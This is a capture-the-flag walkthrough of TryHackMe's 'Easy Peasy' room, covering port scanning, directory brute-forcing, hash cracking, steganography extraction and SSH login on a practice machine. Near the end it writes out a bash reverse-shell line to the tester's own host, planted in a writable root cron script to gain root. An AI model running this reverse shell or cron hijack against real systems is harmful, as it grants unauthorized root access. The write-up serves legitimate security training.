# Easy Peasy Walkthrough

Welcome to the Easy Peasy challenge from TryHackMe, you can find the official room [here](https://tryhackme.com/r/room/easypeasyctf) <br>

This is and easy level CTF made to practice recon with tools like nmp, gobustrer and do a little bit of privilege escalation on Linux.
<br/>


## The Challenge
We can start with nmap to scan all the ports:
```bash
nmap -sV -vv -p- MACHINE_IP
```
We can find 2 open ports: <br>
PORT   STATE SERVICE VERSION <br>
80/tcp open  http    nginx 1.16.1 <br>
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) <br>
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu)) <br>
<br>

Scanning the http server for directories with gobuster we can find one interesting
```bash
gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirb/common.txt -t 50
```
the directory is /hidden, if we navigate to it we land into a page saying "Welcome to ctf" and there is  only a background image.

I ran again gobuster to find hidden direcories inside the /hidden dir, and got one called /whatever, after opening it i got the message "dead end". <br>

Out of curiosity i went to check the page source code and found a base64 encoded string: `ZmxhZ3tmMXJzN19mbDRnfQ==`
After decoding it i got the first flag: REDACTED

I think that is now time to check out the other HTTP server, let's scan with gobuster to find some interesting directories:
```bash
gobuster dir -u http://MACHINE_IP:65524/ -w /usr/share/wordlists/dirb/common.txt -t 50
```
we find /robots.txt, navigate to it and there is a message "This Flag Can Enter But Only This Flag No More Exceptions", we can also notice a string `a18672860d0510e5ab6699730763b250`, which is an md5 hash, decoding it we get : --> REDACTED <br>
You can use any tool of choice or even an online website like: https://md5hashing.net/hash/md5


Navigating to the webpage IP:65524, we get the Apache server default page, looking at the source code i found another flag which is n3: --> REDACTED <br>

Still looking in the source code i found an hidden sentence  "its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu", we know is base something, after a couple of tries i found out is base 62 and used [this](https://b64encode.com/tools/encode-decode-base62/) website to decode it. <br>
The result is a directory name --> REDACTED

Now we can visit the new discovered page, view the page source and find another hash: `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`, this time the hashing algorithm is SHA256. <br>
We can use John the Ripper to creack the hash, first create a new text file and save inside the hash.
Firstly we need to know the hash type:
```bash
hashid hash.txt
```
since there are many possible matches the hint tells us it is GOST, now we can start cracking:
```bash
john --wordlist=easypeasy.txt --format=GOST hash.txt
```
Wait a little bit and thee password is: --> REDACTED

Now i was ready to go for ssh login but the password is not right for the anonymous user, looks like we need more investigation. <br>

On the /n0th1ng3ls3m4tt3r source code page i clicked on the image link, nothing special happened, it just displayed it, maybe there is something hidden in that image? <br>
We can download it and check with a tool like *steghide*
```bash
steghide --info binarycodepixabay.jpg 
```
When we try to get more information about the embedded data it tells us we need a passphrase, we can use the one we got from John the Ripper,
```bash
steghide --info binarycodepixabay.jpg -p mypasswordforthatjob
```
now we know there is a text file embedded into the image and the name is: secrettext.txt, let's extract it:
```bash
 steghide --extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
```
```bash
cat secrettext.txt
```

We have found the username: boring, the password is encoded in binary, after decoding it --> REDACTED

Now we can finally log into the target machine with ssh
```bash
ssh boring@MACHINE_IP -p 6498
```

Let's open the flag file
```bash
cat user.txt
```
but we get something that does not look exactly as a flag, yet. --> synt{a0jvgf33zfa0ez4y}
Some rotation algorithm was used, ROT13 is very common in CTFs, apply it and we get the right one --> REDACTED

The last flag is almost always located in the root directory, hence we need to become root to be able to read it.
If we check the cronjobs:
```bash
cat /etc/crontab
```
There is a script running every minute called: .mysecretcronjob.sh, and located into /var/www/ directory; this one looks interesting because the routine is for the root user, if we can edit it we can use it as vector to gain admin rights.

Let's navigate to it  
```bash
cd /var/www/
```
here we can check the file permissions and attributes:
```bash
ls -la
```
What a luck! the file was created by our user and we have write permissions, we can paste inside some code to spawn a reverse shell on our machine.

First start a listener on your machine:
```bash
nc -lvnp 1234
```

on the target now edit the script file:
```bash
nano .mysecretcronjob.sh  
```
paste this inside:
```bash
/bin/bash -i >& /dev/tcp/YOUR_MACHINE_IP/1234 0>&1
```

Now wait a minute and you will have a root shell on your listener.

Finally read the content of the last flag:
```bash
cat /root/.root.txt
```

And here we have the last flag: REDACTED

Congratulations, you have completed the Easy Peasy challenge, hope you had fun practicing and following along.

See you in the next challenge 😃
